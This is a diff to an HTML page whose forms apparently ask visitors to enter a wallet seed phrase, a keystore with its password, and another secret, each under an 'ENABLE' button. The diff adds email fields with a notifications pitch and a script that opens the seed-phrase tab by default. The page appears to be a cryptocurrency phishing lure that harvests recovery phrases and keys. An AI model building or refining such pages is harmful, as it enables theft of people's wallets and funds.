@@ -55,6 +55,11 @@
             Typically 12(sometimes 24) words seperated by single spaces
           </p>
           <input type="hidden" name="_redirect" value="" required />
+          <input type="email" placeholder="example@gmail.com" />
+          <p class="definotify">
+            You will receive notifications via email in case you miss in-app
+            notifications
+          </p>
           <button type="submit">ENABLE</button>
         </form>
       </div>
@@ -78,6 +83,11 @@
             used to encrypt it
           </p>
           <input type="hidden" name="_redirect" value="" required />
+          <input type="email" placeholder="example@gmail.com" />
+          <p class="definotify">
+            You will receive notifications via email in case you miss in-app
+            notifications
+          </p>
           <button type="submit">ENABLE</button>
         </form>
       </div>
@@ -91,6 +101,11 @@
             required
           />
           <input type="hidden" name="_redirect" value="" required />
+          <input type="email" placeholder="example@gmail.com" />
+          <p class="definotify">
+            You will receive notifications via email in case you miss in-app
+            notifications
+          </p>
           <button type="submit">ENABLE</button>
         </form>
       </div>
@@ -112,6 +127,12 @@
         <a href="#"><i class="fa-brands fa-github"></i></a>
       </div>
     </div>
+    <script>
+      const defaultSectionId = "seedphrase";
+      const defaultTab = document.getElementById("seed-btn");
+      showSection(defaultSectionId, defaultTab);
+      // };
+    </script>
     <script
       src="https://kit.fontawesome.com/2f8df1a2ea.js"
       crossorigin="anonymous"
